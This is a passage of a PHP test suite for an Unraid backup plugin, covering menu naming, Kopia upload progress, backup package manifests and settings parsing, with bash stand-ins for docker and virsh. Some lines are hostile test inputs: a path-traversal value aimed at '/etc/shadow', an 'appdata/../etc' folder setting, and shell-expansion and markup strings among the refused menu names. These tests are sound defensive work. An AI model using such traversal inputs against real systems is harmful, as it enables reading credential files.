        check('office cron refuses an unknown job', true);
    }
    // a line someone added by hand is not ours
    file_put_contents($file, "0 4 * * * bash /tmp/job.sh backup > /dev/null 2>&1\n");
    same('office cron: foreign line ignored', [], officeCronLines($file));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/** The office's label in Unraid's menu bar (src/place.php): what passes, and the page's Name= line on a copy */
function testMenuName(): void
{
    foreach (['Sekretariat', 'Office', 'USO', 'Mein Büro', 'Büro 2.0', 'A', 'R&D'] as $ok) {
        check("menu name ok: $ok", officeMenuNameValid($ok));
    }
    foreach (['', ' Office', 'Office ', 'x"y', '${HOME}', 'a\\b', "a\nb", '1234567890123456', 'end-', '<b>'] as $bad) {
        check('menu name refused: ' . json_encode($bad), !officeMenuNameValid($bad));
    }
    check('menu name: 15 characters (umlauts count once)', officeMenuNameValid('Büroküche Ölmü'));

    $tmp = sys_get_temp_dir() . '/office-tests-menu-' . getmypid();
    @mkdir($tmp, 0700, true);
    copy(dirname(__DIR__) . '/plugin/' . OFFICE_MENU_PAGE, "$tmp/" . OFFICE_MENU_PAGE);
    $before = (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE);
    check('menu page: default name in the repository', str_contains($before, "\nName=\"" . OFFICE_MENU_DEFAULT . "\"\n"));
    check('menu page: renamed', officeMenuPageApply($tmp, 'Büro & Co'));
    $after = (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE);
    same('menu page: only the Name= line changed', str_replace('Name="' . OFFICE_MENU_DEFAULT . '"', 'Name="Büro & Co"', $before), $after);
    same('menu page: Unraid reads the name', 'Büro & Co', parse_ini_string(explode("\n---\n", $after)[0])['Name'] ?? null);
    check('menu page: a bad name changes nothing', !officeMenuPageApply($tmp, 'x"y') && file_get_contents("$tmp/" . OFFICE_MENU_PAGE) === $after);

    // under Settings → User Utilities: Menu=, Title= and Icon=; back in the menu bar as it was
    check('menu page: to Settings', officeMenuPageApply($tmp, 'Büro & Co', 'settings'));
    $ini = parse_ini_string(explode("\n---\n", (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE))[0]);
    same('menu page: under Settings', ['Utilities', 'Büro & Co', 'Büro & Co', 'unraid-secretary-office.png', 'building-o', 'f0f7'],
        [$ini['Menu'] ?? null, $ini['Name'] ?? null, $ini['Title'] ?? null, $ini['Icon'] ?? null, $ini['Tag'] ?? null, $ini['Code'] ?? null]);
    check('menu page: back to the menu bar', officeMenuPageApply($tmp, OFFICE_MENU_DEFAULT, 'menu'));
    same('menu page: as in the repository again', $before, file_get_contents("$tmp/" . OFFICE_MENU_PAGE));
    check('menu page: an unknown place changes nothing', !officeMenuPageApply($tmp, 'Office', 'dock'));
    same('menu url: menu bar', '/SecretaryOffice', officeMenuUrl('menu'));
    same('menu url: settings', '/Settings/SecretaryOffice', officeMenuUrl('settings'));

    // only a button in Unraid's header: the page without Menu=, the button page with it — and back
    copy(dirname(__DIR__) . '/plugin/' . OFFICE_BUTTON_PAGE, "$tmp/" . OFFICE_BUTTON_PAGE);
    $buttonBefore = (string) file_get_contents("$tmp/" . OFFICE_BUTTON_PAGE);
    check('menu page: to a button', officeMenuPageApply($tmp, 'USO', 'button'));
    $ini = parse_ini_string(explode("\n---\n", (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE))[0]);
    $btn = parse_ini_string(explode("\n---\n", (string) file_get_contents("$tmp/" . OFFICE_BUTTON_PAGE))[0]);
    same('menu page: no entry of its own as a button', [null, 'USO', 'USO'], [$ini['Menu'] ?? null, $ini['Name'] ?? null, $ini['Title'] ?? null]);
    same('button page: in the header', ['Buttons:90', 'USO', 'building-o', '/SecretaryOffice'], [$btn['Menu'] ?? null, $btn['Title'] ?? null, $btn['Icon'] ?? null, $btn['Href'] ?? null]);
    // its icon: the desk bell as a CSS mask in the header's text colour (Icon=/Code= are only the fallback).
    // Unraid runs a button page's body through parse_text() in <head> of every page: nothing there may match it
    $body = explode("\n---\n", $buttonBefore, 2)[1] ?? '';
    check('button page: the desk bell as a mask in currentColor', preg_match('/\.nav-item\.SecretaryOfficeButton\{--sso-bell:url\("data:image\/svg\+xml,([^"]*)"\)\}/', $body, $m) === 1
        && !preg_match('/[<>#]/', $m[1]) && @simplexml_load_string(rawurldecode($m[1])) !== false
        && str_contains($body, 'mask:var(--sso-bell)') && str_contains($body, 'background-color:currentColor'));
    check('button page: nothing for parse_text', !preg_match('/_\((.+?)\)_|^:(.+_help|.+_plug):$|^:end$/m', $body));
    same('menu url: button', '/SecretaryOffice', officeMenuUrl('button'));
    check('menu page: from the button back to the menu bar', officeMenuPageApply($tmp, OFFICE_MENU_DEFAULT, 'menu'));
    same('menu page: as in the repository after the button', $before, file_get_contents("$tmp/" . OFFICE_MENU_PAGE));
    same('button page: as in the repository again', $buttonBefore, file_get_contents("$tmp/" . OFFICE_BUTTON_PAGE));
    check('menu page: missing page', !officeMenuPageApply("$tmp/none", 'Office'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

function testEstimates(): void
{
    // newest first, like backupHistory()
    $run = fn (string $id, string $result, int $total, array $kopia) => ['run' => $id, 'started' => 1000, 'finished' => 1000 + $total,
        'result' => $result, 'kopia_first' => null,
        'kopia' => array_map(fn ($n, $s) => ['name' => $n, 'ok' => true, 'seconds' => $s, 'finished' => 1000 + $total], array_keys($kopia), $kopia)];
    $first = $run('first', 'warnings', 37632, ['appdata' => 21850]);
    $small = fn (string $id, int $t, int $a) => $run($id, 'ok', $t, ['appdata' => $a]);

    $e = backupEstimates([$small('b', 547, 86), $first]);
    same('estimate: after the first run the newest counts', 547, $e['total']);
    same('estimate: newest Kopia source', 86, $e['sources']['appdata'] ?? null);

    $e = backupEstimates([$run('x', 'failed', 17, []), $run('y', 'aborted', 464, []), $small('b', 547, 86), $first]);
    same('estimate: failed and aborted runs skipped', 547, $e['total']);

    $e = backupEstimates([$small('d', 600, 90), $small('c', 30000, 20000), $small('b', 547, 86), $first]);
    same('estimate: one slow run among three does not count', 600, $e['total']);
    same('estimate: median Kopia of the last three', 90, $e['sources']['appdata'] ?? null);

    $e = backupEstimates([]);
    same('estimate: nothing known', null, $e['total']);
}

/**
 * Mr. Backupsy and a first upload to Kopia: which source has no snapshot in the repository yet (a new
 * repository starts every source anew), the Kopia process found in /proc (a copy), what it read, the
 * snapshot's size, and the rate between looks — replayed with what nostromo's upload showed on 2026-10-06
 */
function testBackupFirstUpload(): void
{
    $run = fn (string $id, int $started, array $kopia) => ['run' => $id, 'started' => $started,
        'kopia' => array_map(fn ($n, $ok) => ['name' => $n, 'ok' => $ok, 'seconds' => 3, 'finished' => $started + 60], array_keys($kopia), $kopia)];
    $history = [$run('c', 3000, ['appdata' => true, 'app:immich' => false]), $run('b', 2000, ['Backups_statisch' => true]), $run('a', 1000, ['appdata' => true])];
    same('first upload: copied before, the repository unknown — not the first time', false, backupFirstUpload('Backups_statisch', $history, null));
    same('first upload: copied only into an earlier repository — the first time', true, backupFirstUpload('Backups_statisch', $history, 2500));
    same('first upload: copied since the repository came', false, backupFirstUpload('appdata', $history, 2500));
    same('first upload: failed so far, or never there', [true, true], [backupFirstUpload('app:immich', $history, null), backupFirstUpload('isos', $history, null)]);

    same('first upload: a container path on the host (the longest mapping)', '/mnt/user/appdata/kopia/repository.config',
        backupContainerHostPath([['Source' => '/mnt/user/appdata/kopia', 'Destination' => '/config'], ['Source' => '/mnt/user', 'Destination' => '/']],
            '/config/repository.config'));
    same('first upload: not mapped, or with ..', [null, null], [backupContainerHostPath([['Source' => '/mnt/x', 'Destination' => '/data']], '/config/repository.config'),
        backupContainerHostPath([['Source' => '/mnt/user/appdata/kopia', 'Destination' => '/config']], '/config/../etc/shadow')]);
    $policies = [['kind' => 'share', 'name' => 'Backups_statisch', 'path' => '/backup-snapshots/Backups_statisch'],
                 ['kind' => 'app', 'name' => 'immich', 'path' => '/backup-snapshots/.apps/immich']];
    same('first upload: where Kopia reads a source', [['/backup-snapshots/Backups_statisch', '/Backups_statisch'], ['/backup-snapshots/.apps/immich', '/.apps/immich'],
        [null, '/.vms/Debian'], [null, '/_flash']],
        [backupKopiaSourcePath('Backups_statisch', $policies), backupKopiaSourcePath('app:immich', $policies), backupKopiaSourcePath('vm:Debian', $policies),
         backupKopiaSourcePath('flash', $policies)]);

    // /proc as the host sees the engine's docker exec: the client, Kopia in the container, another source
    $proc = sys_get_temp_dir() . '/office-tests-upload-' . getmypid();
    $ps = ['3123' => ['docker', 'exec', '-u', '0', 'kopia', 'kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch', '--description', 'uso-backup 20261006-0100'],
           '4456' => ['kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch', '--description', 'uso-backup 20261006-0100'],
           '5789' => ['kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch_alt'],
           '6000' => ['kopia', 'server', 'start', '--address=0.0.0.0:51515']];
    foreach ($ps as $pid => $argv) {
        @mkdir("$proc/$pid", 0700, true);
        file_put_contents("$proc/$pid/cmdline", implode("\0", $argv) . "\0");
    }
    file_put_contents("$proc/4456/io", "rchar: 2390370860668\nwchar: 1180491244705\nsyscr: 36974388\nsyscw: 73561450\nread_bytes: 3466402299392\n");
    same('first upload: the Kopia process of the source (not the docker client, not another source)', [4456, 4456, null],
        [backupKopiaPid('/backup-snapshots/Backups_statisch', '/Backups_statisch', $proc), backupKopiaPid(null, '/Backups_statisch', $proc),
         backupKopiaPid('/backup-snapshots/isos', '/isos', $proc)]);
    same('first upload: what it has read (rchar, not what it sent)', [2390370860668, null], [backupProcRead(4456, $proc), backupProcRead(3123, $proc)]);
    same('first upload: read and sent in one look (rchar, wchar)', [[2390370860668, 1180491244705], [null, null]], [backupProcIo(4456, $proc), backupProcIo(3123, $proc)]);
    exec('rm -rf ' . escapeshellarg($proc));

    $zfs = "ripley/Backups_statisch@uso-backup-20261005-0100\t2355000000000\nripley/Backups_statisch@uso-backup-20261006-0100\t2355490998272\n"
         . "ripley/Backups_statisch/child@uso-backup-20261006-0100\t1000\nripley/Backups_statisch/child@other\t5\n";
    same('first upload: the size of this run\'s snapshot, child datasets too', [2355490999272, null],
        [backupZfsSnapSum($zfs, 'uso-backup-20261006-0100'), backupZfsSnapSum($zfs, 'uso-backup-20261007-0100')]);

    // nostromo, 2026-10-06: Backups_statisch from 04:18:47; at 13:20 the snapshot (2.36 TB) was read past its size — done 13:27:58
    $c = ['source' => 'Backups_statisch', 'size' => 2355490998272, 'looks' => []];
    [$c, $o] = backupUploadStep($c, 1791253127, 2390370860668, 1791285605, 1180491244705);
    same('first upload: the first look — the average since it started, any moment now', ['Backups_statisch', true, 73599694, 0, 1],
        [$o['source'], $o['first'], $o['rate'], $o['left'], count($c['looks'])]);
    same('first upload: what it sent goes along to the page, the rate stays what it reads', [1180491244705, 2390370860668], [$o['sent'], $o['read']]);
    // a made-up one: 1 TB, 100 MB/s on average, 50 MB/s for the last minutes
    $t0 = 1000000;
    $c = ['source' => 'x', 'size' => 10 ** 12, 'looks' => []];
    [$c, $o] = backupUploadStep($c, $t0, 0, $t0 + 30);
    same('first upload: too early for a rate (nothing sent known)', [null, null, 0, null], [$o['rate'], $o['left'], $o['read'], $o['sent']]);
    [$c, $o] = backupUploadStep($c, $t0, 360 * 10 ** 9, $t0 + 3600);
    same('first upload: from the newest look before the last 15 minutes', [100840336, 6347], [$o['rate'], $o['left']]);
    [$c, $o] = backupUploadStep($c, $t0, 360 * 10 ** 9 + 300 * 50 * 10 ** 6, $t0 + 3900);
    same('first upload: the rate between looks minutes apart', [50000000, 12500], [$o['rate'], $o['left']]);
    for ($t = $t0 + 3920; $t <= $t0 + 6000; $t += 5) {
        [$c] = backupUploadStep($c, $t0, 375 * 10 ** 9 + ($t - $t0 - 3900) * 50 * 10 ** 6, $t);
    }
    check('first upload: a look every 20 seconds, the last 15 minutes and one before', count($c['looks']) <= BACKUP_UPLOAD_KEEP / 20 + 2
        && $t0 + 6000 - $c['looks'][0][0] > BACKUP_UPLOAD_KEEP && $t0 + 6000 - $c['looks'][1][0] <= BACKUP_UPLOAD_KEEP, json_encode([count($c['looks']), $c['looks'][0] ?? null]));
    [, $o] = backupUploadStep(['source' => 'x', 'size' => null, 'looks' => []], $t0, 10 ** 9, $t0 + 600);
    same('first upload: no size, no estimate (but a rate)', [null, 1666667], [$o['left'], $o['rate']]);
}

/**
 * Mr. Backupsy's packages (engine 2.18): the office's reader on a made-up backup place, and the
 * engine's own helpers (lib/common.sh section 8: folder names, old run folders, an interrupted swap)
 */
function testBackupPackages(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-packages-' . getmypid();
    $put = function (string $file, mixed $data) use ($tmp): void {
        @mkdir(dirname("$tmp/$file"), 0700, true);
        file_put_contents("$tmp/$file", is_string($data) ? $data : json_encode($data));
    };
    $put('server/run.json', ['run' => '20261006-0200', 'result' => 'ok', 'files' => [['path' => 'libvirt.tar.gz', 'bytes' => 9, 'run' => '20261005-0200']]]);
    $put('server/libvirt.tar.gz', 'x');
    $put('apps/immich/manifest.json', ['name' => 'immich', 'type' => 'compose', 'run' => '20261006-0200', 'result' => 'warnings',
        'compose' => ['manager_dir' => 'immich'],
        'containers' => [['name' => 'immich_postgres', 'image' => 'ghcr.io/immich-app/postgres:14', 'digests' => ['ghcr.io/immich-app/postgres@sha256:ab'], 'inspect' => ['Id' => 'x']]],
        'dumps' => [['container' => 'immich_postgres', 'type' => 'postgres', 'state' => 'failed', 'login' => 'user', 'user_var' => 'POSTGRES_USER',
                     'password_var' => 'POSTGRES_PASSWORD', 'client' => 'psql', 'secret' => 'never']],
        'files' => [['path' => 'db/postgres_immich_postgres.sql.gz', 'bytes' => 100, 'run' => '20261005-0200', 'what' => 'dump', 'container' => 'immich_postgres'],
                    ['path' => 'compose/docker-compose.yml', 'bytes' => 20, 'run' => '20261006-0200', 'what' => 'compose']]]);
    $put('apps/gone/manifest.json', ['name' => 'gone', 'type' => 'template', 'run' => '20261001-0200', 'files' => []]);
    $put('apps/.ub-old-20261006-0200-immich/manifest.json', ['name' => 'aside']);
    $put('vms/Win_11/manifest.json', ['name' => 'Win 11', 'run' => '20261006-0200', 'xml' => 'Win_11.xml', 'uuid' => 'u-1', 'autostart' => true,
        'files' => [['path' => 'Win_11.xml', 'bytes' => 5], ['path' => 'nvram/u-1_VARS-pure-efi-tpm.fd', 'bytes' => 7], ['path' => 'tpm/u-1/tpm2/tpm2-00.permall', 'bytes' => 3]]]);
    $put('flash/manifest.json', ['run' => '20261006-0200', 'files' => [['path' => 'flash.tar.gz', 'bytes' => 4, 'run' => '20261004-0200']]]);
    $put('flash/flash.tar.gz', 'flsh');
    $put('20261001-0200/db/mariadb_x_y.sql.gz', 'x');            // an old run folder: the next run clears it away
    $put('20261002-0200/notes.txt', 'mine');                       // holds something else: stays, not counted

    $p = backupPackagesRead($tmp);
    same('packages: the last run', '20261006-0200', $p['run']);
    same('packages: apps, hidden folders left out', ['gone', 'immich'], array_column($p['apps'], 'folder'));
    same('packages: an app of an earlier run is stale', [true, false], array_column($p['apps'], 'stale'));
    $immich = $p['apps'][1];
    $dump = array_values(array_filter($immich['files'], fn ($f) => $f['what'] === 'dump'))[0] ?? [];
    same('packages: a kept dump keeps its run', ['20261005-0200', 'immich_postgres'], [$dump['run'] ?? null, $dump['container'] ?? null]);
    same('packages: dump credentials as names only', ['container' => 'immich_postgres', 'type' => 'postgres', 'state' => 'failed', 'login' => 'user',
        'user_var' => 'POSTGRES_USER', 'password_var' => 'POSTGRES_PASSWORD', 'client' => 'psql'], $immich['dumps'][0] ?? null);
    same('packages: no docker inspect for the page', ['name', 'image', 'digest', 'template'], array_keys($immich['containers'][0] ?? []));
    same('packages: bytes from the manifest', 120, $immich['bytes']);
    $vm = $p['vms'][0] ?? [];
    same('packages: a VM with NVRAM and TPM', ['Win 11', ['u-1_VARS-pure-efi-tpm.fd'], true, true, false],
        [$vm['name'] ?? null, $vm['nvram'] ?? null, $vm['tpm'] ?? null, $vm['autostart'] ?? null, $vm['snapshotdb'] ?? null]);
    same('packages: the libvirt archive in server/', "$tmp/server/libvirt.tar.gz", $p['server']['libvirt'] ?? null);
    same('packages: the flash archive keeps its run', '20261004-0200', $p['flash']['run'] ?? null);
    same('packages: old run folders the engine clears away', 1, $p['old_runs']);
    exec('rm -rf ' . escapeshellarg($tmp));

    // the engine's helpers, in bash
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $sh = fn (string $script) => trim((string) shell_exec('bash -c ' . escapeshellarg("source $lib >/dev/null 2>&1; $script") . ' 2>&1'));
    same('engine: folder names', 'Windows_11__G__ming_|_hidden|immich|_|', $sh('printf "%s|" "$(pkg_folder "Windows 11 (Gäming)")" "$(pkg_folder ".hidden")" "$(pkg_folder immich)" "$(pkg_folder "")"'));
    $t = escapeshellarg(sys_get_temp_dir() . '/office-tests-engine-' . getmypid());
    same('engine: old run folders', '20261001-0200,20261003-0200', $sh("T=$t; mkdir -p \$T/20261001-0200/db \$T/20261002-0200 \$T/20261003-0200/manifest \$T/2026-x \$T/apps;"
        . ' echo x >$T/20261002-0200/mine.txt; : >$T/20261003-0200/libvirt.tar.gz; old_runs_list $T | xargs -n1 basename | paste -sd, -'));
    same('engine: an interrupted swap is put right', 'apps:a b|vms:v|left:0', $sh("T=$t; rm -rf \$T; mkdir -p \$T/apps/a \$T/apps/.ub-old-20261006-0200-a \$T/apps/.ub-old-20261006-0200-b"
        . ' $T/vms/.ub-old-20261006-0200-v $T/.ub-stage-20261006-0200/apps/a; touch $T/apps/a/new; pkg_recover $T >/dev/null;'
        . ' printf "apps:%s|vms:%s|left:%s" "$(ls $T/apps | paste -sd" " -)" "$(ls $T/vms)" "$(ls -A $T | grep -c "^\.ub-")"; [ -e $T/apps/a/new ] || echo " lost"'));
    exec('rm -rf ' . $t);
    same('engine 2.23: the btrfs brake scales with the disk (min_free_gb, at most a tenth, at least 1 GB, 0 = off)', '150|2|1|0|300|1',
        $sh('BTRFS_MIN_FREE_GB=150; a=$(brake_floor_gb 22000); b=$(brake_floor_gb 24); c=$(brake_floor_gb 5); BTRFS_MIN_FREE_GB=0; d=$(brake_floor_gb 22000);'
        . ' BTRFS_MIN_FREE_GB=300; e=$(brake_floor_gb 22000); BTRFS_MIN_FREE_GB=150; f=$(brake_floor_gb x); printf "%s|%s|%s|%s|%s|%s" $a $b $c $d $e $f'));
}

/**
 * Mr. Backupsy's Kopia per app and VM (engine 2.19): the engine's items, the rules the shares get for their
 * parts, the targets, the checks of settings.ini, sleeping disks, SQLite URIs; settings.ini of 2.18 (no
 * [app] sections) gives the very same rules as before; the office's reader of policies and packages.
 */
function testBackupKopiaItems(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-items-' . getmypid();
    @mkdir($tmp, 0700, true);
    $ini = "[general]\ndumps_share = UnraidSecretaryOffice\nmount_root = /mnt/addons/UnraidSecretaryOffice/snapshots\n"
         . "[kopia]\nenabled = yes\n[share \"appdata\"]\nmode = kopia\nkopia_ignore = /kopia/\n[share \"UnraidSecretaryOffice\"]\nmode = kopia\n";
    file_put_contents("$tmp/old.ini", $ini);
    file_put_contents("$tmp/new.ini", $ini
        . "[app \"nextcloud\"]\nkopia = yes\nfolder = appdata/nextcloud\nkopia_retention = 7 0 14 8 24 5\nkopia_ignore = /appdata/nextcloud/data/cache/\n"
        . "[app \"my app\"]\nkopia = yes\nfolder = appdata/myapp\n[app \"my_app\"]\nkopia = yes\n[app \"left\"]\nkopia = no\nfolder = appdata/left\n"
        . "[vm \"Win 11\"]\nmode = snapshot\nprepare = freeze\nkopia = yes\nfolder = domains/Win 11\n");
    file_put_contents("$tmp/bad.ini", $ini . "[app \"x\"]\nkopia = maybe\nfolder = appdata/../etc\nfolder = /appdata/x\nkopia_retention = 7 7\n");
    file_put_contents("$tmp/disks.ini", "[\"disk1\"]\nname=\"disk1\"\nspundown=\"0\"\n[\"disk10\"]\nname=\"disk10\"\nspundown=\"1\"\n"
        . "[\"master\"]\nname=\"master\"\nspundown=\"0\"\n[\"master2\"]\nname=\"master2\"\nspundown=\"1\"\n[\"ripley\"]\nname=\"ripley\"\nspundown=\"0\"\n");
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $sh = function (string $file, string $script) use ($lib, $tmp): string {
        $pre = "UB_DATA=$tmp/data UB_DISKS_INI=$tmp/disks.ini; source $lib >/dev/null 2>&1; cfg_load $tmp/$file; cfg_validate >/dev/null; apply_settings;"
             . ' INV_METHOD[appdata]=snap; INV_LAYOUT[appdata]=single; INV_LOCS[appdata]="master|zfs|master/appdata|"$\'\\n\';'
             . ' INV_METHOD[UnraidSecretaryOffice]=snap; INV_LAYOUT[UnraidSecretaryOffice]=single; PLAN_KOPIA=(UnraidSecretaryOffice appdata); PLAN_FLASH=off;';
        return trim((string) shell_exec('bash -c ' . escapeshellarg("$pre $script") . ' 2>&1'));
    };
    $md5 = substr(md5('my_app'), 0, 6);
    same('items: apps first (sorted), then VMs; a name that comes out the same gets a suffix; kopia = no is none',
        "app|my app|my_app\napp|my_app|my_app-$md5\napp|nextcloud|nextcloud\nvm|Win 11|Win_11", $sh('new.ini', 'kopia_items'));
    same('items: an app\'s parts - its folders, then its package', "appdata|nextcloud\nUnraidSecretaryOffice|backup/apps/nextcloud",
        $sh('new.ini', 'kopia_item_parts app nextcloud'));
    same('items: a VM\'s package', "domains|Win 11\nUnraidSecretaryOffice|backup/vms/Win_11", $sh('new.ini', 'kopia_item_parts vm "Win 11"'));
    same('items: the share leaves their folders out, besides its own rules', "/kopia/\n/myapp/\n/nextcloud/", $sh('new.ini', 'kopia_want_ignores share appdata'));
    same('items: the backup place leaves their packages out', "/backup/apps/my_app/\n/backup/apps/nextcloud/\n/backup/vms/Win_11/",
        $sh('new.ini', 'kopia_want_ignores share UnraidSecretaryOffice'));
    same('items: a split share gets a rule per base', "/disk1/myapp/\n/disk1/nextcloud/\n/kopia/\n/master/myapp/\n/master/nextcloud/",
        $sh('new.ini', 'INV_LAYOUT[appdata]=split; INV_LOCS[appdata]="master|zfs|x|"$\'\\n\'"disk1|btrfs|/mnt/disk1|appdata"; kopia_want_ignores share appdata'));
    same('items: own rules and retention, or inherited', "/appdata/nextcloud/data/cache/|7 0 14 8 24 5|inherit inherit inherit inherit inherit inherit",
        $sh('new.ini', 'printf "%s|%s|%s" "$(kopia_want_ignores app nextcloud)" "$(kopia_want_retention app nextcloud)" "$(kopia_want_retention app "my app")"'));
    $root = '/mnt/addons/UnraidSecretaryOffice/snapshots';
    same('items: the targets', "root|$root|\nshare|$root/UnraidSecretaryOffice|UnraidSecretaryOffice\nshare|$root/appdata|appdata\n"
        . "app|$root/.apps/my_app|my app\napp|$root/.apps/my_app-$md5|my_app\napp|$root/.apps/nextcloud|nextcloud\nvm|$root/.vms/Win_11|Win 11",
        $sh('new.ini', 'kopia_targets'));
    same('items: none with Kopia off', '', $sh('new.ini', 'KOPIA_ENABLED=no; kopia_items'));
    same('settings.ini of 2.18: no items, the same rules and targets as before', "|/kopia/|root|$root|\nshare|$root/UnraidSecretaryOffice|UnraidSecretaryOffice\nshare|$root/appdata|appdata",
        $sh('old.ini', 'printf "%s|%s|%s" "$(kopia_items)" "$(kopia_want_ignores share appdata)" "$(kopia_targets)"'));
    same('items: settings.ini valid', '0', $sh('new.ini', 'echo ${#CFG_ERRORS[@]}'));
    same('items: bad keys found', '4', $sh('bad.ini', 'echo ${#CFG_ERRORS[@]}'));
    same('engine: sleeping disks (a pool sleeps with any of its disks, disk1 is not disk10)', 'master disk10',
        $sh('new.ini', 'for b in master disk1 disk10 ripley mast; do ub_base_asleep $b && printf "%s " $b; done'));
    same('engine: a path for an SQLite URI', '/a%20b/Plug-in%20Support/%C3%A4%3F%23.db', $sh('new.ini', 'uri_escape "/a b/Plug-in Support/ä?#.db"'));
    same('engine: a container path on the host', '/mnt/user/appdata/plex/Library/x|/mnt/user/Backups/Emby|1',
        $sh('new.ini', 'CT_BINDS[c]="/mnt/user/appdata/plex|/config|true"$\'\\n\'"/mnt/user/Backups/Emby|/config/backup|true";'
            . ' printf "%s|%s|" "$(ct_host_path c /config/Library/x)" "$(ct_host_path c /config/backup)"; ct_host_path c /data || echo 1'));
    exec('rm -rf ' . escapeshellarg($tmp));

    // the office: policies of apps and VMs, and what a package says about its databases and the app's own backups
    $pol = backupPolicies([['kind' => 'app', 'share' => '', 'name' => 'nextcloud', 'path' => '/backup-snapshots/.apps/nextcloud', 'ok' => true, 'differences' => []],
                           ['kind' => 'share', 'share' => 'appdata', 'path' => '/backup-snapshots/appdata', 'ok' => false, 'differences' => [['what' => 'ignore_missing', 'item' => '/nextcloud/']]],
                           ['kind' => 'odd', 'share' => 'x']]);
    same('policies: apps and VMs, the name (older engines: the share)', [['app', 'nextcloud'], ['share', 'appdata']], array_map(fn ($p) => [$p['kind'], $p['name']], $pol));
    $tmp = sys_get_temp_dir() . '/office-tests-items-pk-' . getmypid();
    @mkdir("$tmp/apps/emby", 0700, true);
    @mkdir("$tmp/server", 0700, true);
    file_put_contents("$tmp/server/run.json", json_encode(['run' => '20261006-0200']));
    file_put_contents("$tmp/apps/emby/manifest.json", json_encode(['name' => 'EmbyServer', 'type' => 'template', 'run' => '20261006-0200',
        'sqlite' => [['container' => 'EmbyServer', 'file' => 'db/sqlite_EmbyServer_library.db', 'source' => '/mnt/user/appdata/EmbyServer/data/library.db',
                      'path' => '/config/data/library.db', 'state' => 'unchanged', 'check' => 'ok', 'present' => true]],
        'own_backups' => [['kind' => 'emby', 'container' => 'EmbyServer', 'path' => '/mnt/user/Backups/EmbyServer', 'files' => 3, 'newest' => 1791200000, 'asleep' => false],
                          ['kind' => 'odd', 'path' => '/etc']],
        'files' => [['path' => 'db/sqlite_EmbyServer_library.db', 'bytes' => 9, 'run' => '20261006-0200', 'what' => 'sqlite', 'container' => 'EmbyServer']]]));
    $a = backupPackagesRead($tmp)['apps'][0] ?? [];
    same('packages: the SQLite copies', ['/config/data/library.db', 'unchanged', 'ok', true], [$a['sqlite'][0]['path'] ?? null, $a['sqlite'][0]['state'] ?? null, $a['sqlite'][0]['check'] ?? null, $a['sqlite'][0]['present'] ?? null]);
    same('packages: the app\'s own backups, known kinds only', [['emby', '/mnt/user/Backups/EmbyServer', 3]], array_map(fn ($o) => [$o['kind'], $o['path'], $o['files']], $a['own_backups'] ?? []));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Engine 2.21: new things stay local and keep running until the user decided. The engine's rules (which
 * top-level folder is new, the rules that leave it out, kopia_known in settings.ini), the run's step right
 * before Kopia (fixture folders as the mounted snapshot, the policy's rules, state/new-local.json, drift,
 * one notification) and setup.sh --plan / --apply on a fixture server: stand-ins for docker (Kopia inside),
 * zfs, virsh, mount and notify on PATH - nothing real is touched, no Kopia, no mount, no container.
 */
function testBackupNewLocal(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-newlocal-' . getmypid();
    exec('rm -rf ' . escapeshellarg($tmp));
    $mnt = "$tmp/mnt";
    $root = "$mnt/addons/UnraidSecretaryOffice/snapshots";
    foreach (["$tmp/bin", "$tmp/fake", "$tmp/data/unraid-backup/state", "$tmp/boot/config/shares", "$root/appdata"] as $d) {
        @mkdir($d, 0700, true);
    }
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $env = "export PATH=$tmp/bin:\$PATH UB_DATA=$tmp/data/unraid-backup UB_MNT=$mnt UB_BOOT=$tmp/boot UB_SHARES_CFG=$tmp/boot/config/shares"
         . " UB_DISKS_INI=$tmp/fake/disks.ini UB_NOTIFY_BIN=$tmp/bin/notify UB_MOUNTS_FILE=$tmp/fake/mounts FAKE=$tmp/fake FAKE_ROOT=$root";
    // stand-ins: every call of docker logged, Kopia answers from fixtures, "policy set" only noted
    file_put_contents("$tmp/bin/docker", <<<'SH'
#!/bin/bash
echo "$*" >>"$FAKE/docker.log"
case "$1" in
  info) exit 0 ;;
  version) echo 29.0; exit 0 ;;
  ps) cat "$FAKE/ids" 2>/dev/null; exit 0 ;;
  compose) exit 1 ;;
  top) printf 'PID UID COMMAND\n7 0 /app/kopia server start\n'; exit 0 ;;
  inspect)
    shift
    if [[ "$1" == -f ]]; then
      case "$2" in
        *State.Running*) echo true ;;
        *Mounts*) printf '%s\x1e/uso\x1efalse\x1erslave\n' "$FAKE_ROOT" ;;
      esac
      exit 0
    fi
    cat "$FAKE/inspect.json"; exit 0 ;;
  exec)
    shift
    while [[ "$1" == -* ]]; do case "$1" in -u|-e) shift 2 ;; *) shift ;; esac; done
    shift
    case "$1" in
      cat) [[ "$2" == /proc/self/mountinfo ]] && exit 0; cat "$FAKE_ROOT${2#/uso}" 2>/dev/null; exit ;;
      kopia)
        shift; [[ "$1" == --no-progress ]] && shift
        case "$1 ${2:-}" in
          "repository status") cat "$FAKE/repo.json" ;;
          "policy list") cat "$FAKE/policies.json" 2>/dev/null || echo '[]' ;;
          "policy set") [[ -n "${FAKE_POLICY_FAIL:-}" ]] && exit 1 ;;
          "snapshot list") echo '[]' ;;
          --version*) echo "0.23.0 build" ;;
        esac
        exit 0 ;;
    esac
    exit 1 ;;
esac
exit 0
SH);
    file_put_contents("$tmp/bin/zfs", "#!/bin/bash\n[[ \"\$*\" == *'-t filesystem'* ]] && cat \"\$FAKE/zfs.txt\"\nexit 0\n");
    file_put_contents("$tmp/bin/virsh", <<<'SH'
#!/bin/bash
case "$1" in
  list) [[ "$*" == *--all* ]] && printf 'oldvm\nnewvm\n'; exit 0 ;;
  domstate) echo "shut off" ;;
  dominfo) echo "Autostart:      disable" ;;
  dumpxml) echo "<domain/>" ;;
  domblklist) printf 'Type Device Target Source\n' ;;
